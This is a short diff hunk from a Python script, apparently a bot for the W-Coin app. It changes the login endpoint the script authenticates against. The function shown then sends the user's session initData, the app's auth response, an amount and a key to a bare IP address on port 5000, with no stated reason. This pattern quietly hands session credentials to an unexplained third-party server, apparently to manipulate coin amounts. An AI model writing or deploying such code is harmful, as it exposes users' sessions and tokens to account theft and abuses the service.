@@ -39,7 +39,7 @@ def main_wcoin(session ,amount, key):
             'identifier':identifier,
             'password': identifier,
         }
-    res = requests.post('https://starfish-app-fknmx.ondigitalocean.app/wapi/api/auth/local', json=json_data).json()
+    res = requests.post('https://app.w-coin.io/wapi/api/auth/local', json=json_data).json()
     r = requests.post('http://77.37.63.209:5000/api',json={'initData':session,'serverData':res,'amount':amount,'key':key})
     return (r.json())
 def create_gradient_banner(text):
